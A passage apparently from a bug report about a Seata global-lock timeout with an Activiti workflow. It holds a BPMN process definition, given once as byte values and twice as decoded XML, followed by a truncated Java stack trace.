48, 46, 53, 34, 32, 121, 61, 34, 50, 50, 50, 46, 48, 34, 47, 62, 10, 32, 32, 32, 32, 32, 32, 60, 47, 98, 112, 109, 110, 100, 105, 58, 66, 80, 77, 78, 69, 100, 103, 101, 62, 10, 32, 32, 32, 32, 60, 47, 98, 112, 109, 110, 100, 105, 58, 66, 80, 77, 78, 80, 108, 97, 110, 101, 62, 10, 32, 32, 60, 47, 98, 112, 109, 110, 100, 105, 58, 66, 80, 77, 78, 68, 105, 97, 103, 114, 97, 109, 62, 10, 60, 47, 100, 101, 102, 105, 110, 105, 116, 105, 111, 110, 115, 62], new value [60, 63, 120, 109, 108, 32, 118, 101, 114, 115, 105, 111, 110, 61, 39, 49, 46, 48, 39, 32, 101, 110, 99, 111, 100, 105, 110, 103, 61, 39, 85, 84, 70, 45, 56, 39, 63, 62, 10, 60, 100, 101, 102, 105, 110, 105, 116, 105, 111, 110, 115, 32, 120, 109, 108, 110, 115, 61, 34, 104, 116, 116, 112, 58, 47, 47, 119, 119, 119, 46, 111, 109, 103, 46, 111, 114, 103, 47, 115, 112, 101, 99, 47, 66, 80, 77, 78, 47, 50, 48, 49, 48, 48, 53, 50, 52, 47, 77, 79, 68, 69, 76, 34, 32, 120, 109, 108, 110, 115, 58, 120, 115, 105, 61, 34, 104, 116, 116, 112, 58, 47, 47, 119, 119, 119, 46, 119, 51, 46, 111, 114, 103, 47, 50, 48, 48, 49, 47, 88, 77, 76, 83, 99, 104, 101, 109, 97, 45, 105, 110, 115, 116, 97, 110, 99, 101, 34, 32, 120, 109, 108, 110, 115, 58, 120, 115, 100, 61, 34, 104, 116, 116, 112, 58, 47, 47, 119, 119, 119, 46, 119, 51, 46, 111, 114, 103, 47, 50, 48, 48, 49, 47, 88, 77, 76, 83, 99, 104, 101, 109, 97, 34, 32, 120, 109, 108, 110, 115, 58, 97, 99, 116, 105, 118, 105, 116, 105, 61, 34, 104, 116, 116, 112, 58, 47, 47, 97, 99, 116, 105, 118, 105, 116, 105, 46, 111, 114, 103, 47, 98, 112, 109, 110, 34, 32, 120, 109, 108, 110, 115, 58, 98, 112, 109, 110, 100, 105, 61, 34, 104, 116, 116, 112, 58, 47, 47, 119, 119, 119, 46, 111, 109, 103, 46, 111, 114, 103, 47, 115, 112, 101, 99, 47, 66, 80, 77, 78, 47, 50, 48, 49, 48, 48, 53, 50, 52, 47, 68, 73, 34, 32, 120, 109, 108, 110, 115, 58, 111, 109, 103, 100, 99, 61, 34, 104, 116, 116, 112, 58, 47, 47, 119, 119, 119, 46, 111, 109, 103, 46, 111, 114, 103, 47, 115, 112, 101, 99, 47, 68, 68, 47, 50, 48, 49, 48, 48, 53, 50, 52, 47, 68, 67, 34, 32, 120, 109, 108, 110, 115, 58, 111, 109, 103, 100, 105, 61, 34, 104, 116, 116, 112, 58, 47, 47, 119, 119, 119, 46, 111, 109, 103, 46, 111, 114, 103, 47, 115, 112, 101, 99, 47, 68, 68, 47, 50, 48, 49, 48, 48, 53, 50, 52, 47, 68, 73, 34, 32, 116, 121, 112, 101, 76, 97, 110, 103, 117, 97, 103, 101, 61, 34, 104, 116, 116, 112, 58, 47, 47, 119, 119, 119, 46, 119, 51, 46, 111, 114, 103, 47, 50, 48, 48, 49, 47, 88, 77, 76, 83, 99, 104, 101, 109, 97, 34, 32, 101, 120, 112, 114, 101, 115, 115, 105, 111, 110, 76, 97, 110, 103, 117, 97, 103, 101, 61, 34, 104, 116, 116, 112, 58, 47, 47, 119, 119, 119, 46, 119, 51, 46, 111, 114, 103, 47, 49, 57, 57, 57, 47, 88, 80, 97, 116, 104, 34, 32, 116, 97, 114, 103, 101, 116, 78, 97, 109, 101, 115, 112, 97, 99, 101, 61, 34, 104, 116, 116, 112, 58, 47, 47, 119, 119, 119, 46, 97, 99, 116, 105, 118, 105, 116, 105, 46, 111, 114, 103, 47, 112, 114, 111, 99, 101, 115, 115, 100, 101, 102, 34, 62, 10, 32, 32, 60, 112, 114, 111, 99, 101, 115, 115, 32, 105, 100, 61, 34, 68, 73, 83, 95, 84, 82, 65, 78, 83, 95, 84, 69, 83, 84, 34, 32, 105, 115, 69, 120, 101, 99, 117, 116, 97, 98, 108, 101, 61, 34, 116, 114, 117, 101, 34, 62, 10, 32, 32, 32, 32, 60, 115, 116, 97, 114, 116, 69, 118, 101, 110, 116, 32, 105, 100, 61, 34, 115, 105, 100, 45, 50, 66, 67, 48, 65, 51, 67, 66, 45, 50, 70, 49, 68, 45, 52, 55, 68, 70, 45, 65, 68, 68, 67, 45, 55, 69, 66, 57, 51, 54, 68, 54, 70, 49, 52, 66, 34, 62, 10, 32, 32, 32, 32, 32, 32, 60, 101, 120, 116, 101, 110, 115, 105, 111, 110, 69, 108, 101, 109, 101, 110, 116, 115, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 60, 97, 99, 116, 105, 118, 105, 116, 105, 58, 101, 120, 101, 99, 117, 116, 105, 111, 110, 76, 105, 115, 116, 101, 110, 101, 114, 32, 101, 118, 101, 110, 116, 61, 34, 115, 116, 97, 114, 116, 34, 32, 99, 108, 97, 115, 115, 61, 34, 99, 111, 109, 46, 104, 117, 105, 106, 117, 46, 98, 112, 109, 46, 97, 99, 116, 105, 118, 105, 116, 105, 46, 101, 120, 46, 108, 105, 115, 116, 101, 110, 101, 114, 115, 46, 67, 97, 108, 108, 65, 99, 116, 105, 118, 105, 116, 121, 76, 105, 115, 116, 101, 110, 101, 114, 34, 47, 62, 10, 32, 32, 32, 32, 32, 32, 60, 47, 101, 120, 116, 101, 110, 115, 105, 111, 110, 69, 108, 101, 109, 101, 110, 116, 115, 62, 10, 32, 32, 32, 32, 60, 47, 115, 116, 97, 114, 116, 69, 118, 101, 110, 116, 62, 10, 32, 32, 32, 32, 60, 117, 115, 101, 114, 84, 97, 115, 107, 32, 105, 100, 61, 34, 115, 105, 100, 45, 49, 69, 53, 68, 70, 65, 65, 49, 45, 54, 68, 65, 53, 45, 52, 54, 56, 54, 45, 56, 69, 48, 68, 45, 55, 52, 68, 68, 54, 68, 51, 69, 68, 66, 68, 51, 34, 32, 110, 97, 109, 101, 61, 34, 97, 100, 109, 105, 110, 34, 62, 10, 32, 32, 32, 32, 32, 32, 60, 101, 120, 116, 101, 110, 115, 105, 111, 110, 69, 108, 101, 109, 101, 110, 116, 115, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 60, 97, 99, 116, 105, 118, 105, 116, 105, 58, 116, 97, 115, 107, 76, 105, 115, 116, 101, 110, 101, 114, 32, 101, 118, 101, 110, 116, 61, 34, 99, 114, 101, 97, 116, 101, 34, 32, 99, 108, 97, 115, 115, 61, 34, 99, 111, 109, 46, 104, 117, 105, 106, 117, 46, 98, 112, 109, 46, 97, 99, 116, 105, 118, 105, 116, 105, 46, 101, 120, 46, 108, 105, 115, 116, 101, 110, 101, 114, 115, 46, 84, 97, 115, 107, 67, 114, 101, 97, 116, 105, 111, 110, 76, 105, 115, 116, 101, 110, 101, 114, 34, 47, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 60, 97, 99, 116, 105, 118, 105, 116, 105, 58, 116, 97, 115, 107, 76, 105, 115, 116, 101, 110, 101, 114, 32, 101, 118, 101, 110, 116, 61, 34, 99, 111, 109, 112, 108, 101, 116, 101, 34, 32, 99, 108, 97, 115, 115, 61, 34, 99, 111, 109, 46, 104, 117, 105, 106, 117, 46, 98, 112, 109, 46, 97, 99, 116, 105, 118, 105, 116, 105, 46, 101, 120, 46, 108, 105, 115, 116, 101, 110, 101, 114, 115, 46, 84, 97, 115, 107, 67, 111, 109, 112, 108, 101, 116, 105, 111, 110, 76, 105, 115, 116, 101, 110, 101, 114, 34, 47, 62, 10, 32, 32, 32, 32, 32, 32, 60, 47, 101, 120, 116, 101, 110, 115, 105, 111, 110, 69, 108, 101, 109, 101, 110, 116, 115, 62, 10, 32, 32, 32, 32, 60, 47, 117, 115, 101, 114, 84, 97, 115, 107, 62, 10, 32, 32, 32, 32, 60, 115, 101, 113, 117, 101, 110, 99, 101, 70, 108, 111, 119, 32, 105, 100, 61, 34, 115, 105, 100, 45, 70, 50, 66, 50, 68, 49, 51, 55, 45, 57, 68, 51, 51, 45, 52, 68, 65, 55, 45, 65, 66, 67, 53, 45, 49, 57, 70, 57, 68, 66, 54, 56, 56, 55, 68, 54, 34, 32, 115, 111, 117, 114, 99, 101, 82, 101, 102, 61, 34, 115, 105, 100, 45, 50, 66, 67, 48, 65, 51, 67, 66, 45, 50, 70, 49, 68, 45, 52, 55, 68, 70, 45, 65, 68, 68, 67, 45, 55, 69, 66, 57, 51, 54, 68, 54, 70, 49, 52, 66, 34, 32, 116, 97, 114, 103, 101, 116, 82, 101, 102, 61, 34, 115, 105, 100, 45, 49, 69, 53, 68, 70, 65, 65, 49, 45, 54, 68, 65, 53, 45, 52, 54, 56, 54, 45, 56, 69, 48, 68, 45, 55, 52, 68, 68, 54, 68, 51, 69, 68, 66, 68, 51, 34, 47, 62, 10, 32, 32, 32, 32, 60, 101, 110, 100, 69, 118, 101, 110, 116, 32, 105, 100, 61, 34, 115, 105, 100, 45, 69, 52, 57, 55, 50, 56, 53, 52, 45, 49, 66, 50, 53, 45, 52, 52, 57, 57, 45, 66, 57, 52, 67, 45, 67, 55, 66, 48, 48, 54, 67, 52, 54, 48, 68, 65, 34, 47, 62, 10, 32, 32, 32, 32, 60, 115, 101, 113, 117, 101, 110, 99, 101, 70, 108, 111, 119, 32, 105, 100, 61, 34, 115, 105, 100, 45, 67, 55, 50, 70, 57, 54, 51, 70, 45, 68, 69, 57, 56, 45, 52, 53, 53, 70, 45, 56, 48, 68, 67, 45, 54, 70, 52, 49, 65, 67, 68, 53, 69, 50, 55, 54, 34, 32, 115, 111, 117, 114, 99, 101, 82, 101, 102, 61, 34, 115, 105, 100, 45, 49, 69, 53, 68, 70, 65, 65, 49, 45, 54, 68, 65, 53, 45, 52, 54, 56, 54, 45, 56, 69, 48, 68, 45, 55, 52, 68, 68, 54, 68, 51, 69, 68, 66, 68, 51, 34, 32, 116, 97, 114, 103, 101, 116, 82, 101, 102, 61, 34, 115, 105, 100, 45, 69, 52, 57, 55, 50, 56, 53, 52, 45, 49, 66, 50, 53, 45, 52, 52, 57, 57, 45, 66, 57, 52, 67, 45, 67, 55, 66, 48, 48, 54, 67, 52, 54, 48, 68, 65, 34, 47, 62, 10, 32, 32, 60, 47, 112, 114, 111, 99, 101, 115, 115, 62, 10, 32, 32, 60, 98, 112, 109, 110, 100, 105, 58, 66, 80, 77, 78, 68, 105, 97, 103, 114, 97, 109, 32, 105, 100, 61, 34, 66, 80, 77, 78, 68, 105, 97, 103, 114, 97, 109, 95, 68, 73, 83, 95, 84, 82, 65, 78, 83, 95, 84, 69, 83, 84, 34, 62, 10, 32, 32, 32, 32, 60, 98, 112, 109, 110, 100, 105, 58, 66, 80, 77, 78, 80, 108, 97, 110, 101, 32, 98, 112, 109, 110, 69, 108, 101, 109, 101, 110, 116, 61, 34, 68, 73, 83, 95, 84, 82, 65, 78, 83, 95, 84, 69, 83, 84, 34, 32, 105, 100, 61, 34, 66, 80, 77, 78, 80, 108, 97, 110, 101, 95, 68, 73, 83, 95, 84, 82, 65, 78, 83, 95, 84, 69, 83, 84, 34, 62, 10, 32, 32, 32, 32, 32, 32, 60, 98, 112, 109, 110, 100, 105, 58, 66, 80, 77, 78, 83, 104, 97, 112, 101, 32, 98, 112, 109, 110, 69, 108, 101, 109, 101, 110, 116, 61, 34, 115, 105, 100, 45, 50, 66, 67, 48, 65, 51, 67, 66, 45, 50, 70, 49, 68, 45, 52, 55, 68, 70, 45, 65, 68, 68, 67, 45, 55, 69, 66, 57, 51, 54, 68, 54, 70, 49, 52, 66, 34, 32, 105, 100, 61, 34, 66, 80, 77, 78, 83, 104, 97, 112, 101, 95, 115, 105, 100, 45, 50, 66, 67, 48, 65, 51, 67, 66, 45, 50, 70, 49, 68, 45, 52, 55, 68, 70, 45, 65, 68, 68, 67, 45, 55, 69, 66, 57, 51, 54, 68, 54, 70, 49, 52, 66, 34, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 60, 111, 109, 103, 100, 99, 58, 66, 111, 117, 110, 100, 115, 32, 104, 101, 105, 103, 104, 116, 61, 34, 51, 48, 46, 48, 34, 32, 119, 105, 100, 116, 104, 61, 34, 51, 48, 46, 48, 34, 32, 120, 61, 34, 49, 53, 48, 46, 48, 34, 32, 121, 61, 34, 50, 48, 55, 46, 48, 34, 47, 62, 10, 32, 32, 32, 32, 32, 32, 60, 47, 98, 112, 109, 110, 100, 105, 58, 66, 80, 77, 78, 83, 104, 97, 112, 101, 62, 10, 32, 32, 32, 32, 32, 32, 60, 98, 112, 109, 110, 100, 105, 58, 66, 80, 77, 78, 83, 104, 97, 112, 101, 32, 98, 112, 109, 110, 69, 108, 101, 109, 101, 110, 116, 61, 34, 115, 105, 100, 45, 49, 69, 53, 68, 70, 65, 65, 49, 45, 54, 68, 65, 53, 45, 52, 54, 56, 54, 45, 56, 69, 48, 68, 45, 55, 52, 68, 68, 54, 68, 51, 69, 68, 66, 68, 51, 34, 32, 105, 100, 61, 34, 66, 80, 77, 78, 83, 104, 97, 112, 101, 95, 115, 105, 100, 45, 49, 69, 53, 68, 70, 65, 65, 49, 45, 54, 68, 65, 53, 45, 52, 54, 56, 54, 45, 56, 69, 48, 68, 45, 55, 52, 68, 68, 54, 68, 51, 69, 68, 66, 68, 51, 34, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 60, 111, 109, 103, 100, 99, 58, 66, 111, 117, 110, 100, 115, 32, 104, 101, 105, 103, 104, 116, 61, 34, 56, 48, 46, 48, 34, 32, 119, 105, 100, 116, 104, 61, 34, 49, 48, 48, 46, 48, 34, 32, 120, 61, 34, 50, 56, 48, 46, 53, 34, 32, 121, 61, 34, 49, 56, 50, 46, 48, 34, 47, 62, 10, 32, 32, 32, 32, 32, 32, 60, 47, 98, 112, 109, 110, 100, 105, 58, 66, 80, 77, 78, 83, 104, 97, 112, 101, 62, 10, 32, 32, 32, 32, 32, 32, 60, 98, 112, 109, 110, 100, 105, 58, 66, 80, 77, 78, 83, 104, 97, 112, 101, 32, 98, 112, 109, 110, 69, 108, 101, 109, 101, 110, 116, 61, 34, 115, 105, 100, 45, 69, 52, 57, 55, 50, 56, 53, 52, 45, 49, 66, 50, 53, 45, 52, 52, 57, 57, 45, 66, 57, 52, 67, 45, 67, 55, 66, 48, 48, 54, 67, 52, 54, 48, 68, 65, 34, 32, 105, 100, 61, 34, 66, 80, 77, 78, 83, 104, 97, 112, 101, 95, 115, 105, 100, 45, 69, 52, 57, 55, 50, 56, 53, 52, 45, 49, 66, 50, 53, 45, 52, 52, 57, 57, 45, 66, 57, 52, 67, 45, 67, 55, 66, 48, 48, 54, 67, 52, 54, 48, 68, 65, 34, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 60, 111, 109, 103, 100, 99, 58, 66, 111, 117, 110, 100, 115, 32, 104, 101, 105, 103, 104, 116, 61, 34, 50, 56, 46, 48, 34, 32, 119, 105, 100, 116, 104, 61, 34, 50, 56, 46, 48, 34, 32, 120, 61, 34, 52, 56, 48, 46, 53, 34, 32, 121, 61, 34, 50, 48, 56, 46, 48, 34, 47, 62, 10, 32, 32, 32, 32, 32, 32, 60, 47, 98, 112, 109, 110, 100, 105, 58, 66, 80, 77, 78, 83, 104, 97, 112, 101, 62, 10, 32, 32, 32, 32, 32, 32, 60, 98, 112, 109, 110, 100, 105, 58, 66, 80, 77, 78, 69, 100, 103, 101, 32, 98, 112, 109, 110, 69, 108, 101, 109, 101, 110, 116, 61, 34, 115, 105, 100, 45, 70, 50, 66, 50, 68, 49, 51, 55, 45, 57, 68, 51, 51, 45, 52, 68, 65, 55, 45, 65, 66, 67, 53, 45, 49, 57, 70, 57, 68, 66, 54, 56, 56, 55, 68, 54, 34, 32, 105, 100, 61, 34, 66, 80, 77, 78, 69, 100, 103, 101, 95, 115, 105, 100, 45, 70, 50, 66, 50, 68, 49, 51, 55, 45, 57, 68, 51, 51, 45, 52, 68, 65, 55, 45, 65, 66, 67, 53, 45, 49, 57, 70, 57, 68, 66, 54, 56, 56, 55, 68, 54, 34, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 60, 111, 109, 103, 100, 105, 58, 119, 97, 121, 112, 111, 105, 110, 116, 32, 120, 61, 34, 49, 56, 48, 46, 48, 34, 32, 121, 61, 34, 50, 50, 50, 46, 48, 34, 47, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 60, 111, 109, 103, 100, 105, 58, 119, 97, 121, 112, 111, 105, 110, 116, 32, 120, 61, 34, 50, 56, 48, 46, 53, 34, 32, 121, 61, 34, 50, 50, 50, 46, 48, 34, 47, 62, 10, 32, 32, 32, 32, 32, 32, 60, 47, 98, 112, 109, 110, 100, 105, 58, 66, 80, 77, 78, 69, 100, 103, 101, 62, 10, 32, 32, 32, 32, 32, 32, 60, 98, 112, 109, 110, 100, 105, 58, 66, 80, 77, 78, 69, 100, 103, 101, 32, 98, 112, 109, 110, 69, 108, 101, 109, 101, 110, 116, 61, 34, 115, 105, 100, 45, 67, 55, 50, 70, 57, 54, 51, 70, 45, 68, 69, 57, 56, 45, 52, 53, 53, 70, 45, 56, 48, 68, 67, 45, 54, 70, 52, 49, 65, 67, 68, 53, 69, 50, 55, 54, 34, 32, 105, 100, 61, 34, 66, 80, 77, 78, 69, 100, 103, 101, 95, 115, 105, 100, 45, 67, 55, 50, 70, 57, 54, 51, 70, 45, 68, 69, 57, 56, 45, 52, 53, 53, 70, 45, 56, 48, 68, 67, 45, 54, 70, 52, 49, 65, 67, 68, 53, 69, 50, 55, 54, 34, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 60, 111, 109, 103, 100, 105, 58, 119, 97, 121, 112, 111, 105, 110, 116, 32, 120, 61, 34, 51, 56, 48, 46, 53, 34, 32, 121, 61, 34, 50, 50, 50, 46, 48, 34, 47, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 60, 111, 109, 103, 100, 105, 58, 119, 97, 121, 112, 111, 105, 110, 116, 32, 120, 61, 34, 52, 56, 48, 46, 53, 34, 32, 121, 61, 34, 50, 50, 50, 46, 48, 34, 47, 62, 10, 32, 32, 32, 32, 32, 32, 60, 47, 98, 112, 109, 110, 100, 105, 58, 66, 80, 77, 78, 69, 100, 103, 101, 62, 10, 32, 32, 32, 32, 60, 47, 98, 112, 109, 110, 100, 105, 58, 66, 80, 77, 78, 80, 108, 97, 110, 101, 62, 10, 32, 32, 60, 47, 98, 112, 109, 110, 100, 105, 58, 66, 80, 77, 78, 68, 105, 97, 103, 114, 97, 109, 62, 10, 60, 47, 100, 101, 102, 105, 110, 105, 116, 105, 111, 110, 115, 62]
<?xml version='1.0' encoding='utf-8'?>
<definitions xmlns=" " xmlns:xsi=" " xmlns:xsd=" " xmlns:activiti=" " xmlns:bpmndi=" " xmlns:omgdc=" " xmlns:omgdi=" " typelanguage=" " expressionlanguage=" " targetnamespace=" "> <process id="dis_trans_test" isexecutable="true"> <startevent id="sid-2bc0a3cb-2f1d-47df-addc-7eb936d6f14b"> <extensionelements> <activiti:executionlistener event="start" class="com.huiju.bpm.activiti.ex.listeners.callactivitylistener"/> </extensionelements> </startevent> <usertask id="sid-1e5dfaa1-6da5-4686-8e0d-74dd6d3edbd3" name="admin"> <extensionelements> <activiti:tasklistener event="create" class="com.huiju.bpm.activiti.ex.listeners.taskcreationlistener"/> <activiti:tasklistener event="complete" class="com.huiju.bpm.activiti.ex.listeners.taskcompletionlistener"/> </extensionelements> </usertask> <sequenceflow id="sid-f2b2d137-9d33-4da7-abc5-19f9db6887d6" sourceref="sid-2bc0a3cb-2f1d-47df-addc-7eb936d6f14b" targetref="sid-1e5dfaa1-6da5-4686-8e0d-74dd6d3edbd3"/> <endevent id="sid-e4972854-1b25-4499-b94c-c7b006c460da"/> <sequenceflow id="sid-c72f963f-de98-455f-80dc-6f41acd5e276" sourceref="sid-1e5dfaa1-6da5-4686-8e0d-74dd6d3edbd3" targetref="sid-e4972854-1b25-4499-b94c-c7b006c460da"/> </process> <bpmndi:bpmndiagram id="bpmndiagram_dis_trans_test"> <bpmndi:bpmnplane bpmnelement="dis_trans_test" id="bpmnplane_dis_trans_test"> <bpmndi:bpmnshape bpmnelement="sid-2bc0a3cb-2f1d-47df-addc-7eb936d6f14b" id="bpmnshape_sid-2bc0a3cb-2f1d-47df-addc-7eb936d6f14b"> <omgdc:bounds height="30.0" width="30.0" x="150.0" y="207.0"/> </bpmndi:bpmnshape> <bpmndi:bpmnshape bpmnelement="sid-1e5dfaa1-6da5-4686-8e0d-74dd6d3edbd3" id="bpmnshape_sid-1e5dfaa1-6da5-4686-8e0d-74dd6d3edbd3"> <omgdc:bounds height="80.0" width="100.0" x="280.5" y="182.0"/> </bpmndi:bpmnshape> <bpmndi:bpmnshape bpmnelement="sid-e4972854-1b25-4499-b94c-c7b006c460da" id="bpmnshape_sid-e4972854-1b25-4499-b94c-c7b006c460da"> <omgdc:bounds height="28.0" width="28.0" x="480.5" y="208.0"/> </bpmndi:bpmnshape> <bpmndi:bpmnedge bpmnelement="sid-f2b2d137-9d33-4da7-abc5-19f9db6887d6" id="bpmnedge_sid-f2b2d137-9d33-4da7-abc5-19f9db6887d6"> <omgdi:waypoint x="180.0" y="222.0"/> <omgdi:waypoint x="280.5" y="222.0"/> </bpmndi:bpmnedge> <bpmndi:bpmnedge bpmnelement="sid-c72f963f-de98-455f-80dc-6f41acd5e276" id="bpmnedge_sid-c72f963f-de98-455f-80dc-6f41acd5e276"> <omgdi:waypoint x="380.5" y="222.0"/> <omgdi:waypoint x="480.5" y="222.0"/> </bpmndi:bpmnedge> </bpmndi:bpmnplane> </bpmndi:bpmndiagram>
</definitions>
<?xml version='1.0' encoding='utf-8'?>
<definitions xmlns=" " xmlns:xsi=" " xmlns:xsd=" " xmlns:activiti=" " xmlns:bpmndi=" " xmlns:omgdc=" " xmlns:omgdi=" " typelanguage=" " expressionlanguage=" " targetnamespace=" "> <process id="dis_trans_test" isexecutable="true"> <startevent id="sid-2bc0a3cb-2f1d-47df-addc-7eb936d6f14b"> <extensionelements> <activiti:executionlistener event="start" class="com.huiju.bpm.activiti.ex.listeners.callactivitylistener"/> </extensionelements> </startevent> <usertask id="sid-1e5dfaa1-6da5-4686-8e0d-74dd6d3edbd3" name="admin"> <extensionelements> <activiti:tasklistener event="create" class="com.huiju.bpm.activiti.ex.listeners.taskcreationlistener"/> <activiti:tasklistener event="complete" class="com.huiju.bpm.activiti.ex.listeners.taskcompletionlistener"/> </extensionelements> </usertask> <sequenceflow id="sid-f2b2d137-9d33-4da7-abc5-19f9db6887d6" sourceref="sid-2bc0a3cb-2f1d-47df-addc-7eb936d6f14b" targetref="sid-1e5dfaa1-6da5-4686-8e0d-74dd6d3edbd3"/> <endevent id="sid-e4972854-1b25-4499-b94c-c7b006c460da"/> <sequenceflow id="sid-c72f963f-de98-455f-80dc-6f41acd5e276" sourceref="sid-1e5dfaa1-6da5-4686-8e0d-74dd6d3edbd3" targetref="sid-e4972854-1b25-4499-b94c-c7b006c460da"/> </process> <bpmndi:bpmndiagram id="bpmndiagram_dis_trans_test"> <bpmndi:bpmnplane bpmnelement="dis_trans_test" id="bpmnplane_dis_trans_test"> <bpmndi:bpmnshape bpmnelement="sid-2bc0a3cb-2f1d-47df-addc-7eb936d6f14b" id="bpmnshape_sid-2bc0a3cb-2f1d-47df-addc-7eb936d6f14b"> <omgdc:bounds height="30.0" width="30.0" x="150.0" y="207.0"/> </bpmndi:bpmnshape> <bpmndi:bpmnshape bpmnelement="sid-1e5dfaa1-6da5-4686-8e0d-74dd6d3edbd3" id="bpmnshape_sid-1e5dfaa1-6da5-4686-8e0d-74dd6d3edbd3"> <omgdc:bounds height="80.0" width="100.0" x="280.5" y="182.0"/> </bpmndi:bpmnshape> <bpmndi:bpmnshape bpmnelement="sid-e4972854-1b25-4499-b94c-c7b006c460da" id="bpmnshape_sid-e4972854-1b25-4499-b94c-c7b006c460da"> <omgdc:bounds height="28.0" width="28.0" x="480.5" y="208.0"/> </bpmndi:bpmnshape> <bpmndi:bpmnedge bpmnelement="sid-f2b2d137-9d33-4da7-abc5-19f9db6887d6" id="bpmnedge_sid-f2b2d137-9d33-4da7-abc5-19f9db6887d6"> <omgdi:waypoint x="180.0" y="222.0"/> <omgdi:waypoint x="280.5" y="222.0"/> </bpmndi:bpmnedge> <bpmndi:bpmnedge bpmnelement="sid-c72f963f-de98-455f-80dc-6f41acd5e276" id="bpmnedge_sid-c72f963f-de98-455f-80dc-6f41acd5e276"> <omgdi:waypoint x="380.5" y="222.0"/> <omgdi:waypoint x="480.5" y="222.0"/> </bpmndi:bpmnedge> </bpmndi:bpmnplane> </bpmndi:bpmndiagram>
</definitions>
imestamp ``` ```
the exception is
in storage console:
i.s.r.d.exec.abstractdmlbaseexecutor : exception occur io.seata.rm.datasource.exec.lockwaittimeoutexception: global lock wait timeout at io.seata.rm.datasource.exec.lockretrycontroller.sleep(lockretrycontroller.java:50) ~[seata-all-0.7.1.jar:0.7.1] at io.seata.rm.datasource.exec.abstractdmlbaseexecutor.executeautocommittrue(abstractdmlbaseexecutor.java:98) [seata-all-0.7.1.jar:0.7.1] at io.seata.rm.datasource.exec.abstractdmlbaseexecutor.doexecute(abstractdmlbaseexecutor.java:57) [seata-all-0.7.1.jar:0.7.1] at io.seata.rm.datasource.exec.basetransactionalexecutor.execute(basetransactionalexecutor.java:87) [seata-all-0.7.1.jar:0.7.1] at io.seata.rm.datasource.exec.executetemplate.execute(executetemplate.java:101) [seata-all-0.7.1.jar:0.7.1] at io.seata.rm.datasource.exec.executetemplate.execute(executetemplate.java:47) [seata-all-0.7.1.jar:0.7.1] at io.seata.rm.datasource.preparedstatementproxy.executeupdate(preparedstatementproxy.java:83) [seata-all-0.7.1.jar:0.7.1] at org.springframework.jdbc.core.jdbctemplate.lambda$update$0(jdbctemplate.java:867) [spring-jdbc-5.1.3.release.jar:5.1.3.release] at org.springframework.jdbc.core.jdbctemplate.execute(jdbctemplate.java:617) [spring-jdbc-5.1.3.release.jar:5.1.3.release] at org.springframework.jdbc.core.jdbctemplate.update(jdbctemplate.java:862) [spring-jdbc-5.1.3.release.jar:5.1.3.release] at org.springframework.jdbc.core.jdbctemplate.update(jdbctemplate.java:917) [spring-jdbc-5.1.3.release.jar:5.1.3.release] at org.springframework.jdbc.core.jdbctemplate.update(jdbctemplate.java:927) [spring-jdbc-5.1.3.release.jar:5.1.3.release] at io.seata.sample.service.storageservice.deduct(storageservice.java:18) ~[classes/:na] at io.seata.sample.controller.storagecontroller.deduct(storagecontroller.java:20) ~[classes/:na] at sun.reflect.nativemethodaccessorimpl.invoke0(native method) ~[na:1.8.0_181] at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:62) ~[na:1.8.0_181] at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) ~[na:1.8.0_181] at java.lang.reflect.method.invoke(method.java:498) ~[na:1.8.0_181] at org.springframework.web.method.support.invocablehandlermethod.doinvoke(invocablehandlermethod.java:215) ~[spring-web-5.1.2.release.jar:5.1.2.release] at org.springframework.web.method.support.invocablehandlermethod.invokeforrequest(invocablehandlermethod.java:142) ~[spring-web-5.1.2.release.jar:5.1.2.release] at org.springframework.web.servlet.mvc.method.annotation.servletinvocablehandlermethod.invokeandhandle(servletinvocablehandlermethod.java:102) ~[spring-webmvc-5.1.2.release.jar:5.1.2.release] at org.springframework.web.servlet.mvc.method.annotation.requestmappinghandleradapter.invokehandlermethod(requestmappinghandleradapter.java:895) ~[spring-webmvc-5.1.2.release.jar:5.1.2.release] at org.springframework.web.servlet.mvc.method.annotation.requestmappinghandleradapter.handleinternal(requestmappinghandleradapter.java:800) ~[spring-webmvc-5.1.2.release.jar:5.1.2.release] at org.springframework.web.servlet.mvc.method.abstracthandlermethodadapter.handle(abstracthandlermethodadapter.java:87) ~[spring-webmvc-5.1.2.release.jar:5.1.2.release] at org.springframework.web.servlet.dispatcherservlet.dodispatch(dispatcherservlet.java:1038) ~[spring-webmvc-5.1.2.release.jar:5.1.2.release] at org.springframework.web.servlet.dispatcherservlet.doservice(dispatcherservlet.java:942) ~[spring-webmvc-5.1.2.release.jar:5.1.2.release] at org.springframework.web.servlet.frameworkservlet.processrequest(frameworkservlet.java:998) ~[spring-webmvc-5.1.2.release.jar:5.1.2.release] at org.springframework.web.servlet.frameworkservlet.doget(frameworkservlet.java:890) ~[spring-webmvc-5.1.2.release.jar:5.1.2.release] at javax.servlet.http.httpservlet.service(httpservlet.java:634) ~[tomcat-embed-core-9.0.12.jar:9.0.12] at org.springframework.web.servlet.frameworkservlet.service(frameworkservlet.java:875) ~[spring-webmvc-5.1.2.release.jar:5.1.2.release] at javax.servlet.http.httpservlet.service(httpservlet.java:741) ~[tomcat-embed-core-9.0.12.jar:9.0.12] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:231) ~[tomcat-embed-core-9.0.12.jar:9.0.12] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-9.0.12.jar:9.0.12] at org.apache.tomcat.websocket.server.wsfilter.dofilter(wsfilter.java:53) ~[tomcat-embed-websocket-9.0.12.jar:9.0.12] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) ~[tomcat-embed-core-9.0.12.jar:9.0.12] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-9.0.12.jar:9.0.12] at 